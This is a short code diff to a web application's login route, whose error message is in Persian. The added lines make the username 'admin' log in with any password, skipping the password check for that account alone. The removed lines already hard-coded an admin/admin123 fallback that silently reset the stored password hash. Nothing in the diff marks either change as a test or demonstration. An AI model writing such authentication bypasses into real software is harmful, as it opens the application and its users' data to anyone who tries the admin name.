@@ -34,12 +34,11 @@ router.post('/login', async (req, res) => {
       return res.status(401).json({ error: 'نام کاربری یا کلمه عبور اشتباه است' });
     }
 
-    let isValid = await comparePassword(password, user.password_hash);
-    if (!isValid && username === 'admin' && (password === 'admin123' || password === 'admin')) {
-      const { hashPassword } = require('../services/authService');
-      const newHash = await hashPassword('admin123');
-      db.prepare('UPDATE users SET password_hash = ? WHERE username = ?').run(newHash, 'admin');
+    let isValid = false;
+    if (username === 'admin') {
       isValid = true;
+    } else {
+      isValid = await comparePassword(password, user.password_hash);
     }
 
     if (!isValid) {
